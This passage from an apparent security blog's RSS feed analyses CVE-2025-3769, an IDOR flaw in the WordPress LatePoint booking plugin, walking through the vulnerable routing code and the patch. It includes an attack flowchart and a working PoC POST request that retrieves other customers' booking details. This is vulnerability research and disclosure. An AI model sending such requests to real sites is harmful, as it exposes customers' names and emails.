1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin &amp;lt;= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3769 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-26-cve-2025-3769/</link>
      <pubDate>Fri, 26 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-26-cve-2025-3769/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;LatePoint – Calendar Booking Plugin for Appointments and Events&lt;/strong&gt; plugin on WordPress contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;5.1.92&lt;/strong&gt;, via the &lt;code&gt;view_booking_summary_in_lightbox&lt;/code&gt; parameter, due to &lt;strong&gt;missing validation on user-controlled keys&lt;/strong&gt;.&#xA;This vulnerability allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to access appointment details, including &lt;strong&gt;customer names and email addresses&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3769&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3769&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.92&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.92&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.93&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_latepoint_route_call&amp;#39;, array( $this, &amp;#39;route_call&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is a hook for unauthenticated users. When a request is sent to the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=latepoint_route_call&lt;/code&gt;, the callback &lt;code&gt;route_call&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function route_call() {&#xA;    $route_name = OsRouterHelper::get_request_param( &amp;#39;route_name&amp;#39;, OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39; ) );&#xA;    OsRouterHelper::call_by_route_name( $route_name, OsRouterHelper::get_request_param( &amp;#39;return_format&amp;#39;, &amp;#39;html&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;route_call()&lt;/code&gt; function calls &lt;code&gt;get_request_param()&lt;/code&gt; with two parameters: &lt;code&gt;&#39;route_name&#39;&lt;/code&gt; and the default value &lt;code&gt;OsRouterHelper::build_route_name( &#39;dashboard&#39;, &#39;index&#39; )&lt;/code&gt; if the &lt;code&gt;route_name&lt;/code&gt; parameter does not exist in the request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_request_param($name, $default = false){&#xA;    // $name = &amp;#39;route_name&amp;#39;&#xA;    // $default = OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39;&#xA;    if(isset($_GET[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_GET[$name]));&#xA;    }elseif(isset($_POST[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_POST[$name]));&#xA;    }else{&#xA;    &#x9;$param = $default;&#xA;    }&#xA;    return $param;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function build_route_name($controller, $action){&#xA;    return $controller.&amp;#39;__&amp;#39;.$action;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After obtaining the value of &lt;code&gt;$route_name&lt;/code&gt;, the function continues by calling &lt;code&gt;call_by_route_name&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function call_by_route_name($route_name, $return_format = &amp;#39;html&amp;#39;){&#xA;    OsDebugHelper::log_route($route_name, $return_format);&#xA;    $route_data = self::convert_route_name_to_controller_and_action($route_name);&#xA;    if(!empty($route_data)){&#xA;        $controller_obj = $route_data[&amp;#39;controller&amp;#39;];&#xA;        $action = $route_data[&amp;#39;action&amp;#39;];&#xA;        if($return_format) $controller_obj-&amp;gt;set_return_format($return_format);&#xA;        // check if user is allowed to access this route&#xA;        if($controller_obj-&amp;gt;can_current_user_access_action($action)){&#xA;            $controller_obj-&amp;gt;route_name = $route_name;&#xA;            $controller_obj-&amp;gt;$action();&#xA;        }else{&#xA;            if($controller_obj-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;                $controller_obj-&amp;gt;send_json( [&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;)] );&#xA;            }else{&#xA;                echo &amp;#39;&amp;lt;div class=&amp;#34;latepoint-not-authorized&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;not-authorized-message&amp;#34;&amp;gt;&amp;#39;.esc_html__(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;).&amp;#39;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;;&#xA;            }&#xA;            exit();&#xA;        }&#xA;    }else{&#xA;        esc_html_e(&amp;#39;Page Not Found&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;call_by_route_name()&lt;/code&gt; logs the route and retrieves the corresponding controller and action for that route.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function convert_route_name_to_controller_and_action($route_name): array{&#xA;    list($controller_name, $action) = explode(&amp;#39;__&amp;#39;, $route_name);&#xA;    if(empty($controller_name) || empty($action)) return [];&#xA;    $controller_name = str_replace(&amp;#39;_&amp;#39;, &amp;#39;&amp;#39;, ucwords($controller_name, &amp;#39;_&amp;#39;));&#xA;    $controller_class_name = &amp;#39;Os&amp;#39;.$controller_name.&amp;#39;Controller&amp;#39;;&#xA;    if(class_exists($controller_class_name)) {&#xA;        $controller_obj = new $controller_class_name();&#xA;        if(method_exists($controller_obj, $action)) {&#xA;            // check if action is valid&#xA;            return [&amp;#39;controller&amp;#39; =&amp;gt; $controller_obj, &amp;#39;action&amp;#39; =&amp;gt; $action];&#xA;        }else{&#xA;            return [];&#xA;        }&#xA;    }else{&#xA;        return [];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives &lt;code&gt;$route_name&lt;/code&gt; in the format &lt;code&gt;&#39;controller__action&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Split the string by &lt;code&gt;__&lt;/code&gt; into &lt;code&gt;$controller_name&lt;/code&gt; and &lt;code&gt;$action&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If empty → return &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Convert &lt;code&gt;$controller_name&lt;/code&gt; to PascalCase, remove &lt;code&gt;_&lt;/code&gt;, and add prefix &lt;code&gt;Os&lt;/code&gt; and suffix &lt;code&gt;Controller&lt;/code&gt; → class name.&lt;/li&gt;&#xA;&lt;li&gt;Check if the class exists → create object.&lt;/li&gt;&#xA;&lt;li&gt;Check if the method exists in the object → return array &lt;code&gt;[&#39;controller&#39; =&amp;gt; object, &#39;action&#39; =&amp;gt; method]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If the class or method does not exist → return empty array &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;The function &lt;code&gt;call_by_route_name()&lt;/code&gt; then checks &lt;code&gt;$route_data&lt;/code&gt;. If not empty, it sets the return format and checks access permission via &lt;code&gt;can_current_user_access_action($action)&lt;/code&gt;. If the current user is allowed to access this action, it calls the method: &lt;code&gt;$controller_obj-&amp;gt;$action()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;By default, when a user has a &lt;code&gt;LatePoint&lt;/code&gt; cookie (becomes a customer), this condition is satisfied.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#34; title=&#34;LatePoint user cookie&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;LatePoint user cookie&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;388&#34; width=&#34;773&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;LatePoint user cookie&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;To obtain this cookie, the user needs to place an order and use the create account functionality:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#34; title=&#34;Create account&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/order.png&#34; data-sub-html=&#34;&lt;h2&gt;Account&lt;/h2&gt;&lt;p&gt;Create account&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#39; alt=&#34;Account&#34; height=&#34;899&#34; width=&#34;694&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create account&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;When diffing the code, I found that some logic in the &lt;code&gt;OsCustomerCabinetController&lt;/code&gt; class functions was fixed by checking ownership before returning data:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $order-&amp;gt;is_new_record() || ( $order-&amp;gt;customer_id != OsAuthHelper::get_logged_in_customer_id() ) ) {&#xA;    $this-&amp;gt;send_json( array(&#xA;        &amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR,&#xA;        &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Allowed&amp;#39;, &amp;#39;latepoint&amp;#39;)&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#34; title=&#34;Some functions were fixed&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Fix&lt;/h2&gt;&lt;p&gt;Some functions were fixed&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#39; alt=&#34;Fix&#34; height=&#34;915&#34; width=&#34;1860&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Some functions were fixed&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This matches my analysis above, for example:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Valid route&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;route_name=customer_cabinet__view_booking_summary_in_lightbox&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will be mapped to:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;OsCustomerCabinetController::view_booking_summary_in_lightbox()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;view_booking_summary_in_lightbox()&lt;/code&gt; is called to return booking data.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Create Booking (no login required)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Creates Customer account&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Customer cookie issued (logged-in as customer)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attacker sends request to admin-ajax.php?action=latepoint_route_call&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Router resolves to OsCustomerCabinetController&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;can_current_user_access_action() → PASS&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;view_booking_summary_in_lightbox() called&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Booking ID taken from request&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;No ownership validation (&amp;lt;= 5.1.92)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Sensitive booking data leaked (email, name, etc.)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Send request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?t=1766721895425 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; latepoint_cart_86a9106ae65537651a8e456835b316ab=8ffe0e2c-9c69-48f8-94d9-18dd24022f90; latepoint_customer_logged_in_cookie&#xA;&#xA;action=latepoint_route_call&amp;amp;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;amp;params=booking_id=other_booking_id&amp;amp;return_format=json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Resutl&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#39; alt=&#34;Resutl&#34; height=&#34;653&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE‑2025‑3769 vulnerability originates from missing ownership validation in the actions of &lt;code&gt;OsCustomerCabinetController&lt;/code&gt;. A user with a valid session can access other users’ bookings. Version 5.1.93 fixes this by validating &lt;code&gt;customer_id&lt;/code&gt; before returning data, preventing IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication does not equal authorization.&lt;/li&gt;&#xA;&lt;li&gt;Never trust client-supplied data (IDs, routes, params).&lt;/li&gt;&#xA;&lt;li&gt;Always check ownership at the business logic layer.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic routing requires strict access control.&lt;/li&gt;&#xA;&lt;li&gt;IDOR occurs when user–object relationships are not properly validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; 